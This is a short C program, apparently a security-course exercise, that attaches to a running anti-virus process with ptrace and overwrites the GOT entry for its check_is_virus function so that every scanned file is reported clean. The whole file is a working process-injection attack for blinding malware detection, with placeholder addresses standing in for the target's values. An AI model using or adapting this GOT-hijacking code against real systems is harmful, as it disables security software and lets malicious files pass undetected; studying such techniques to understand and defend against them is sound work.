#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>


unsigned ANTI_PID = 0x12345678;
unsigned CHECK_VIRUES_GOT_ENTRY = 0x87654321;
unsigned CHECK_VIRUS_REPLACE_ADDR = 0x71727374;

int main() {
	int pid = ANTI_PID;
	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {  // Attach to the process
	  perror("attach");
	  return -1;
	}

	int status;
	waitpid(pid, &status, 0);  // Wait for the process to stop
	if (WIFEXITED(status)) {  // Abort if the process exits
		return -1;
		}

	// Do your magic here

	// replacing the content of GOT entry with the address of check_is_virus@plt
	// with the address of "is_directory" function - that will return 0 for every file we will try to scan
	unsigned code = ptrace(PTRACE_POKEDATA, pid, CHECK_VIRUES_GOT_ENTRY, CHECK_VIRUS_REPLACE_ADDR);
	if (code == -1){
		perror("poke data");
		return -1;
	}

	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1) {  // Detach when done
	  perror("detach");
	  return -1;
	}

    return 0;
}
